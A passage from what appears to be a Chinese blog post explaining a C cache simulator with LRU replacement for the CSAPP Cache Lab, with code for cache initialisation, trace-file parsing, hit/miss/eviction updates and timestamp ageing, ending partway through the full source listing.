title="init_Cache"></a>init_Cache</h2><p>接下来,开始给Cache分配空间,我们要使用lru策略,所以每一个cache的组成部分都要有valid_bits和tag和stamp(时间戳),三部分构成,考虑到其就像一个二维数组,故我们用一个结构体二维数组来模拟</p><p>先创建结构体,同时创建了一级指针和二级指针</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> valid_bits<span class="token punctuation">;</span>    <span class="token keyword">int</span> tag<span class="token punctuation">;</span>    <span class="token keyword">int</span> stamp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> cache_line<span class="token punctuation">,</span> <span class="token operator">*</span>cache_f<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token operator">*</span>cache<span class="token punctuation">;</span>cache cache_ <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后开始初始化结构体</p><p>先给一级指针开辟空间,再分别给每一个结构体开辟空间,以访问数组的方式初始化每个struct内的三个小玩意,便算是整个初始化完毕了.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">init_cache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cache_ <span class="token operator">=</span> <span class="token punctuation">(</span>cache<span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>cache_f<span class="token punctuation">)</span> <span class="token operator">*</span> S<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> S<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cache_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>cache_f<span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>cache_line<span class="token punctuation">)</span> <span class="token operator">*</span> E<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> E<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            cache_<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>valid_bits <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            cache_<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>tag <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>            cache_<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>stamp <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="simulate-cache"><a href="#simulate-cache" class="headerlink" title="simulate_cache"></a>simulate_cache</h2><p>模拟cache,首先检验我们得到的t路径能不能用,若fp是一个空指针,则该文件不存在,输出错误信息.然后就要通过while循环和fscanf函数来读取给定的trace文件夹中的指令</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403122023645.png" alt="image-20240312190510123"></p><p>显然,里面的指令都是一个operation+address+size,由给定的write up中说到,不用统计I这个指令,所以我们只用考虑Load,Store和Modify三个指令,Modify可以理解为L+S,所以我们通过fscanf得到指令选项后,’L’,’S’都只要更新一次,’M’要更新两次,同时每次读取文件的其中一行我们都要模拟缓存的LRU策略,更新时间戳.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">simulate_cache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    FILE <span class="token operator">*</span>fp <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Fuck you Open error!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">char</span> operation<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> address<span class="token punctuation">;</span>    <span class="token keyword">int</span> size<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">fscanf</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token string">"%c %xu,%d\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>operation<span class="token punctuation">,</span> <span class="token operator">&amp;</span>address<span class="token punctuation">,</span> <span class="token operator">&amp;</span>size<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">switch</span> <span class="token punctuation">(</span>operation<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>        <span class="token keyword">case</span> <span class="token char">'L'</span><span class="token operator">:</span>            <span class="token function">update</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token char">'M'</span><span class="token operator">:</span>            <span class="token function">update</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token char">'S'</span><span class="token operator">:</span>            <span class="token function">update</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">update_stamp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> S<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token function">free</span><span class="token punctuation">(</span>cache_<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>cache_<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当然在遍历完trace文件后,我们要记得关闭文件夹指针,同时挨个挨个释放malloc分配的空间.毕竟有借有还,再借不难!</p><h2 id="update"><a href="#update" class="headerlink" title="update"></a>update</h2><p>这里我们这样模拟:对于传进来的地址,我们先要拆出他的set_index,拆出他的tag,Block Offset的位数由给定的-b参数决定,set_index由-s的参数决定,故我们通过进制位移得到如下:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> set_address <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>address <span class="token operator">>></span> b<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1U</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token punctuation">(</span><span class="token number">64</span> <span class="token operator">-</span> s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> cache_tag <span class="token operator">=</span> address <span class="token operator">>></span> <span class="token punctuation">(</span>s <span class="token operator">+</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后我们取到了这几个地址后就要分别判断是hit,还是miss,还是miss+eviction,所以我们要分别判断在对应的set里面,遍历一次.</p><ol><li>第一个循环判断的是能否hit</li><li>第二个循环判断的是是否有空行能够使用</li><li>第三个循环把使用时间最久的行驱逐换上新的行,复位时间戳.</li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> address<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> set_address <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>address <span class="token operator">>></span> b<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1U</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token punctuation">(</span><span class="token number">64</span> <span class="token operator">-</span> s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> cache_tag <span class="token operator">=</span> address <span class="token operator">>></span> <span class="token punctuation">(</span>s <span class="token operator">+</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> E<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>cache_<span class="token punctuation">[</span>set_address<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>tag <span class="token operator">==</span> cache_tag<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            hit_count<span class="token operator">++</span><span class="token punctuation">;</span>            cache_<span class="token punctuation">[</span>set_address<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>stamp <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> E<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>cache_<span class="token punctuation">[</span>set_address<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>valid_bits <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            miss_count<span class="token operator">++</span><span class="token punctuation">;</span>            cache_<span class="token punctuation">[</span>set_address<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>valid_bits <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            cache_<span class="token punctuation">[</span>set_address<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>stamp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            cache_<span class="token punctuation">[</span>set_address<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>tag <span class="token operator">=</span> cache_tag<span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> max_stamp <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> waste <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    miss_count<span class="token operator">++</span><span class="token punctuation">;</span>    eviction_count<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> E<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>cache_<span class="token punctuation">[</span>set_address<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>stamp <span class="token operator">></span> max_stamp<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            max_stamp <span class="token operator">=</span> cache_<span class="token punctuation">[</span>set_address<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>stamp<span class="token punctuation">;</span>            waste <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    cache_<span class="token punctuation">[</span>set_address<span class="token punctuation">]</span><span class="token punctuation">[</span>waste<span class="token punctuation">]</span><span class="token punctuation">.</span>stamp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    cache_<span class="token punctuation">[</span>set_address<span class="token punctuation">]</span><span class="token punctuation">[</span>waste<span class="token punctuation">]</span><span class="token punctuation">.</span>tag <span class="token operator">=</span> cache_tag<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="update-stamp"><a href="#update-stamp" class="headerlink" title="update_stamp"></a>update_stamp</h2><p>更新时间戳很简单,就是把合法情况全遍历一遍,时间戳都加一</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">update_stamp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> S<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> E<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>cache_<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>valid_bits <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>                <span class="token operator">++</span>cache_<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>stamp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="总体代码"><a href="#总体代码" class="headerlink" title="总体代码:"></a>总体代码:</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"cachelab.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;getopt.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> h<span class="token punctuation">,</span> v<span class="token punctuation">,</span> s<span class="token punctuation">,</span> E<span class="token punctuation">,</span> b<span class="token punctuation">,</span> S<span class="token punctuation">;</span><span class="token keyword">int</span> hit_count<span class="token punctuation">,</span> miss_count<span class="token punctuation">,</span> eviction_count<span class="token punctuation">;</span><span class="token keyword">char</span> t<span class="token punctuation">[</span><span class="token number">1000</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> valid_bits<span class="token punctuation">;</span>    <span class="token keyword">int</span> tag<span class="token punctuation">;</span>    <span class="token keyword">int</span> stamp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> cache_line<span class="token punctuation">,</span> <span class="token operator">*</span>cache_f<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token operator">*</span>cache<span class="token punctuation">;</span>cache cache_ <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">printUsage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Fuck you Vite ,Do it quickly ,Don't play game! OK?\n"</span>           <span class="token string">"Usage: ./csim-ref [-hv] -s &lt;num> -E &lt;num> -b &lt;num> -t &lt;file>\n"</span>           <span class="token string">"Options:\n"</span>           <span class="token string">"  -h         Print this help message.\n"</span>           <span class="token string">"  -v         Optional verbose flag.\n"</span>           <span class="token string">"  -s &lt;num>   Number of set index bits.\n"</span>           <span class="token string">"  -E &lt;num>   Number of lines per set.\n"</span>           <span class="token string">"  -b &lt;num>   Number of block offset bits.\n"</span>           <span class="token string">"  -t &lt;file>  Trace file.\n\n"</span>           <span class="token string">"Examples:\n"</span>           <span class="token string">"  linux>  ./csim-ref -s 4 -E 1 -b 4 -t traces/yi.trace\n"</span>           <span class="token string">"  linux>  ./csim-ref -v -s 8 -E 2 -b 4 -t traces/yi.trace\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">init_cache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cache_ <span class="token operator">=</span> <span class="token punctuation">(</span>cache<span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>cache_f<span class="token punctuation">)</span> <span class="token operator">*</span> S<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> S<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cache_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>cache_f<span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>cache_line<span class="token punctuation">)</span> <span class="token operator">*</span> E<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> E<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            cache_<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>valid_bits <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            cache_<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>tag <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>            cache_<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>stamp <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> address<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> set_address <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>address <span class="token operator">>></span> b<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1U</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token punctuation">(</span><span class="token number">64</span> <span class="token operator">-</span> s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> cache_tag <span class="token operator">=</span> address <span class="token operator">>></span> <span class="token punctuation">(</span>s <span class="token operator">+</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> E<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>cache_<span class="token punctuation">[</span>set_address<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>tag <span class="token operator">==</span> cache_tag<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            hit_count<span class="token operator">++</span><span class="token punctuation">;</span>            cache_<span class="token punctuation">[</span>set_address<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>stamp <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> E<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>cache_<span class="token punctuation">[</span>set_address<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>valid_bits <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            miss_count<span class="token operator">++</span><span class="token punctuation">;</span>            cache_<span class="token punctuation">[</span>set_address<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>valid_bits <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            cache_<span class="token punctuation">[</span>set_address<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>stamp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            cache_<span class="token punctuation">[</span>set_address<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>tag <span class="token operator">=</span> cache_tag<span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//</span>    <span class="token keyword">int</span> max_stamp <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> waste <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    miss_count<span class="token operator">++</span><span class="token punctuation">;</span>    eviction_count<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> E<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>cache_<span class="token punctuation">[</span>set_address<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>stamp <span class="token operator">></span> max_stamp<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            max_stamp <span class="token operator">=</span> cache_<span class="token punctuation">[</span>set_address<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>stamp<span class="token punctuation">;</span>            waste <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    cache_<span class="token punctuation">[</span>set_address<span class="token punctuation">]</span><span class="token punctuation">[</span>waste<span class="token punctuation">]</span><span class="token punctuation">.</span>stamp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    cache_<span class="token punctuation">[</span>set_address<span class="token punctuation">]</span><span class="token punctuation">[</span>waste<span class="token punctuation">]</span><span class="token punctuation">.</span>tag <span class="token operator">=</span> cache_tag<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">update_stamp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> S<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> E<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>cache_<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>valid_bits <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>                <span class="token operator">++</span>cache_<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>stamp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">simulate_cache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    FILE <span class="token operator">*</span>fp <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Fuck you Open error!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">char</span> operation<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> address<span class="token punctuation">;</span>    <span class="token 